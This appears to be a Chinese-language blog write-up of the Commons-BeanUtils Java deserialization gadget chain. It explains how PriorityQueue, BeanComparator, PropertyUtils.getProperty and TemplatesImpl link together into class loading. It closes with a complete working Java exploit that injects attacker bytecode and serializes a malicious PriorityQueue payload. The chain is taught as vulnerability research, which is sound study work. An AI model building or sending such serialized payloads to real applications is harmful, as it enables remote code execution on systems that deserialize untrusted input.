---
title: Commons-beanutils
date: 2021-12-23 23:49:13
categories:
- Java
tags:
- Deserialization exploit chain
toc: true
notshow: true
---

# 流程图

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640269301523-ee4fae93-1678-4d69-839b-59448150799a.jpeg)



# 分析与复现

## 0x00 前置知识

### 1. Java Bean

具体可见：[JavaBean](https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680)

### 2. commons-beanutils

commons-beanutils 是 Apache 提供的一个用于操作 JAVA bean （普通 JAVA 类对象）的工具包。里面提供了各种各样的工具类，让我们可以很方便的对 bean 对象的属性进行各种操作。

commons-beanutils 中提供了一个静态方法 PropertyUtils.getProperty，让使用者可以直接调用任意JavaBean的getter方法，比如：

```java
PropertyUtils.getProperty(new Cat(), "name");
```

此时，commons-beanutils 会自动找到 name 属性的 getter 方法，也就是 getName，然后调用，获得返回值。

除此之外，PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过PropertyUtils.getProperty(a, "b.c");的方式进行递归获取。

除了 PropertyUtils 之外，commons-beanutils 还提供了很多别的类：

1. MethodUtils ：通过反射对对象的方法做各种各样的操作。
2. ConstructorUtils ：通过反射对对象的构造方法做各种操作。

1. PropertyUtils ：通过反射对对象的属性做各种操作。
2. BeanUtils：通过反射提供了Bean对象的一些便捷操作方法。

1. ConvertUtils ：提供了数据类型相互转换的一些方法。
2. ....

具体的使用可见：[commons-beanutils使用手册](https://www.jianshu.com/p/ae803ed938e5)

## 0x01 概述

### 1. 利用版本

commons-beanutils 1.9.2

### 2. 限制

无



## 0x02 调用链分析

在前面的 CC 链中我们知道，调用 TemplatesImpl.newTransformer 方法可以进一步调用到后面的 ClassLoader.loadClass

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640267454135-438ef425-8b92-4145-9331-bf896c962cee.png)

也就是说，哪里调用了 newTransformer，哪里就能够走完后面这一条链，在 CC3 中我们找到了 TrAXFilter 的构造函数。实际上我们在 IDEA 中进一步向上寻找时，还能够找到别的方法，就比如这个 getOutputProperties 方法。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640267755778-199f54fa-5db9-4b9d-8561-37f65bd39ece.png)

CB 中的 BeanComparator 类提供了一个 compare 方法，该方法用于比较两个 JavaBean 是否相等，compare 方法中调用了 PropertyUtils.getProperty 方法。我们知道 PropertyUtils.getProperty 最终会调用某个对象的 getXXX 方法。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640267516289-c4175bb6-914d-4bce-af26-1d5e9e22fb42.png)

这样一来，使用 PropertyUtils.getProperty 来调用 TemplatesImpl.getOutputProperties 方法，就可以走完后面的 ClassLoader 了。

另外，在 CC4 那一条链中，我们知道 PriorityQueue.readObject 会调用 compare 方法，正好对应这里的 BeanComparator.compare。因此整条链就走完了

具体调用链如下：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640269321250-560542fa-5bcf-4977-bc69-bd02d60669d8.png)

## 0x03 exp 编写：

需要注意的是，需要调用的方法为 getOutputProperties ，如果使用 PropertyUtils.getProperty 来调用，传入的字符串需要为 "outputProperties"(第一个字母为小写)。

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB {
    public static void main(String[] args) throws Exception{
        TestCB();
        unserialize("abc.ser.bin");
    }

    public static void TestCB() throws Exception {
        Path path = Paths.get("C:\\tmp\\Calc2.class");
        byte[] bytes = Files.readAllBytes(path);
        byte[][] bytes1 = {bytes};
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",bytes1);
        setFieldValue(templates,"_name","aaa");
        setFieldValue(templates,"_class",null);
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator("outputProperties");

        PriorityQueue priorityQueue = new PriorityQueue();

        setFieldValue(priorityQueue,"comparator",null);

        priorityQueue.add("1");
        priorityQueue.add("1");

        setFieldValue(priorityQueue,"queue",new Object[]{templates,templates});

        setFieldValue(priorityQueue,"comparator",beanComparator);
        serialize(priorityQueue);

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serialize(Object o) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("abc.ser.bin"));
        oos.writeObject(o);
    }

    public static void unserialize(String filePath) throws Exception{
        ObjectInputStream ins = new ObjectInputStream(new FileInputStream(filePath));
        ins.readObject();
    }
}
```

## 0x04 总结

commons-beanutils 这条链提供了另一种寻找调用链的方式——Java Bean，getProperty 可以进一步调用 get 开头的方法。commons-beanutils 这些便捷操作的实现，本质上也是使用了反射机制，一旦使用了反射，就不可避免出现容易被攻击者利用的情况，也算是一个为了高效牺牲了安全的例子。



# 参考资料

- [JavaBean](https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680)
- [CommonsBeanutils与无commons-collections的Shiro反序列化利用](https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html)

- [commons-beanutils使用手册](https://www.jianshu.com/p/ae803ed938e5)